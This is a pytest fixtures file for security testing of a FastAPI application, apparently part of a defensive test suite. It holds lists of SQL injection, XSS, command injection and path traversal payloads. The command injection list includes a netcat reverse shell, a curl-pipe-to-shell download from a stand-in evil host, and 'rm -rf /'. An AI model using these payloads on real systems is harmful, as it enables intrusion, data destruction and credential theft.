"""
Security test fixtures and configuration

Shared fixtures for OWASP Top 10 and security testing
"""

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session
from fastapi.testclient import TestClient

from app.database.models import Base
from app.database.connection import get_db
from app.main import app


# Test database URL
TEST_DATABASE_URL = "sqlite:///./test_security.db"


@pytest.fixture(scope="function")
def db_engine():
    """Create test database engine"""
    engine = create_engine(
        TEST_DATABASE_URL,
        connect_args={"check_same_thread": False}  # SQLite specific
    )

    # Create tables
    Base.metadata.create_all(bind=engine)

    yield engine

    # Drop tables after test
    Base.metadata.drop_all(bind=engine)


@pytest.fixture(scope="function")
def db(db_engine):
    """Create database session for tests"""
    TestingSessionLocal = sessionmaker(
        autocommit=False,
        autoflush=False,
        bind=db_engine
    )

    session = TestingSessionLocal()

    # Override dependency
    def override_get_db():
        try:
            yield session
        finally:
            session.close()

    app.dependency_overrides[get_db] = override_get_db

    yield session

    session.close()

    # Clear overrides
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    """Test client fixture"""
    return TestClient(app)


@pytest.fixture
def security_headers():
    """Expected security headers"""
    return {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": ["DENY", "SAMEORIGIN"],
        "X-XSS-Protection": ["1; mode=block", "0"],
        "Referrer-Policy": "strict-origin-when-cross-origin",
    }


@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection test payloads"""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "' OR 1=1--",
        "' OR 'x'='x",
        "1' AND '1' = '1",
        "1' AND '1' = '2' UNION SELECT * FROM users--",
        "' OR '1'='1' /*",
        "'; EXEC sp_executesql--",
    ]


@pytest.fixture
def xss_payloads():
    """Common XSS test payloads"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "javascript:alert('XSS')",
        "<marquee onstart=alert('XSS')>",
    ]


@pytest.fixture
def command_injection_payloads():
    """Common command injection test payloads"""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "|| wget http://malicious.com/backdoor.sh",
        "&& nc -e /bin/sh attacker.com 4444",
        "; curl http://evil.com/shell.sh | sh",
    ]


@pytest.fixture
def path_traversal_payloads():
    """Common path traversal test payloads"""
    return [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "./../../../config.py",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    ]
